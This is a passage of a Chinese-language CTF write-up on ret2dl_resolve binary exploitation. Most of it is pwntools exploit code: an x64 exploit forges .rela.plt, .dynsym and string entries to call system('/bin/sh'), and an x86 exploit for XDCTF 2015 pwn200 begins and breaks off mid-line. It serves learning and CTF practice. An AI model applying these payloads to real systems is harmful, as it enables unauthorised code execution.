    payload += p64(puts_plt)
    payload += p64(start)
    r.sendline(payload)
    link_map_addr = u64(r.recv(6).ljust(8, "\x00"))
loop回start函数继续利用溢出覆盖link_map+0x1c8、构造fake链：
    base_addr = 0x620789 
    align = 0x18 - (base_addr - rel_plt_addr) % 0x18 #Elf64_Rela大小为0x18字节，所以按0x18对齐
    base_addr = base_addr + align #对齐后为0x620798
    reloc_arg = (base_addr - rel_plt_addr) / 0x18 #获得fake .rela.plt偏移
    dynsym_off = (base_addr + 0x18 - dynsym_addr) / 0x18 #获得fake .dynsym偏移
    system_off = base_addr + 0x30 - dynstr_addr 
    bin_sh_addr = base_addr + 0x38
base_addr为puts在fake
.rela.plt的地址，这个位置选在了.data段，因为此段有很大一部分都是可写并且不会影响其他功能，所以在这一段中随便选了一个地址。由于后面有对齐操作，所以这里的base_addr故意没有对齐。
base_addr处，构造后的fake链：
  * 红色fake .rela.plt
  * 蓝色fake .dynsym
  * 绿色system和/bin/sh
最终payload：
    from pwn import *
    #-*- coding:utf-8 -*-    context.log_level = 'debug'
    r = process('./pwn')
    #gdb.attach(r)
    elf = ELF('./pwn')
    puts_plt = 0x4005d0
    read_plt = 0x400600
    exit_plt = 0x400630 
    puts_got = 0x620018
    read_got = 0x620030
    exit_got = 0x620048
    pop_rdi = 0x414fc3
    pop_rsi_r15 = 0x414fc1
    read_func = 0x4007e2
    plt_addr = 0x4005c0
    data_addr = 0x620060
    got_plt_addr = 0x620000
    pop_rbp_ret = 0x4006b0
    leave_ret = 0x4039a3
    dynsym_addr = 0x4002c8
    dynstr_addr = 0x4003e8
    rel_plt_addr = 0x4004f0
    link_map_ptr = got_plt_addr+0x8
    start = 0x400650
    main = 0x4007c3
    r.sendline('-1')
    r.recvuntil('GOOD?\n')
    base_addr = 0x620789
    align = 0x18 - (base_addr - rel_plt_addr) % 0x18 
    base_addr = base_addr + align #0x620798
    reloc_arg = (base_addr - rel_plt_addr) / 0x18 
    dynsym_off = (base_addr + 0x18 - dynsym_addr) / 0x18 
    system_off = base_addr + 0x30 - dynstr_addr
    bin_sh_addr = base_addr + 0x38 
    log.info("base_addr: "+hex(base_addr))
    log.info("reloc_arg: "+hex(reloc_arg))
    log.info("dynsym_off: "+hex(dynsym_off))
    log.info("system_off: "+hex(system_off))
    log.info("bin_sh_addr: "+hex(bin_sh_addr))
    payload = p8(0)*(0x10)
    payload += p64(0)
    payload += p64(pop_rdi)
    payload += p64(link_map_ptr)
    payload += p64(puts_plt)
    payload += p64(start)
    r.sendline(payload)
    link_map_addr = u64(r.recv(6).ljust(8, "\x00"))
    log.success('link_map_addr: ' + hex(link_map_addr))
    r.sendline('-1')
    r.recvuntil('GOOD?\n')
    payload2 = p8(0)*0x18
    payload2 += p64(pop_rsi_r15)
    payload2 += p64(0x20)
    payload2 += p64(0)
    payload2 += p64(pop_rdi)
    payload2 += p64(link_map_addr + 0x1c0)
    payload2 += p64(read_func)
    payload2 += p64(pop_rsi_r15)
    payload2 += p64(0x100)
    payload2 += p64(0)
    payload2 += p64(pop_rdi)
    payload2 += p64(base_addr - 0x8) 
    payload2 += p64(read_func)#读取fake链到可控制区域(.data)
    payload2 += p64(pop_rdi)
    payload2 += p64(bin_sh_addr)
    payload2 += p64(plt_addr) #跳转到PLT[0]，push link_map后执行dl_runtime_resolve
    payload2 += p64(reloc_arg) #跳转到dl_runtime_resolve后，此处为rsp+0x10，被视为reloc_arg
    payload2 += p8(0)*(0x100 - len(payload2))
    r.send(payload2)
    r.send(p8(0)*0x20)
    payload3 = p8(0)*6
    payload3 += p64(read_got)
    payload3 += p32(0x7) + p32(dynsym_off)
    payload3 += p64(0)
    payload3 += p32(system_off) + p32(0x12)
    payload3 += p64(0)*2
    payload3 += 'system\x00\x00'
    payload3 += '/bin/sh\x00'
    payload3 += p8(0)*(0x100 - len(payload3))
    r.send(payload3)
    r.interactive()
# x86
[题目](https://pan.baidu.com/s/1hu_czPQxkyge37Zn68jQYA)  
提取码：ofc6
ctf wiki上的一道题，XDCTF 2015的pwn200。
x86下的结构体和x64略有不同，但利用方法大同小异。
x86下的JMPREL段对应.rel.plt节，而不是x64下的.rela.plt节
找到.rel.plt起始地址  
和.dynsym起始地址  
之后就是慢慢调整偏移
    from pwn import *
    context.log_level = 'debug'
    r = process('./pwn200')
    elf = ELF('./pwn200')
    #gdb.attach(r)
    write_plt = elf.symbols['write']
    write_got = elf.got['write']
    read_plt = elf.symbols['read']
    read_got = elf.got['read']
    start = 0x80483D0
    ppp_ret = 0x080485cd
    pop_ebp = 0x08048453
    leave = 0x08048481
    rel_plt = 0x8048318
    plt0 = 0x8048370
    dynsym = 0x80481D8
    dynstr = 0x8048268
    #构造fake地址
    #这里手动对齐了，所以省去了对齐操作。Elf32_Rel大小为0x10字节，所以除0x10
    base_addr = 0x804a800
    reloc_arg = base_addr + 0x28 - rel_plt
    dynsym_off = (base_addr + 0x38 - dynsym) / 0x10
    system_off = base_addr + 0x48 - dynstr
    binsh_addr =  base_addr + 0x50
    r_info = (dynsym_off 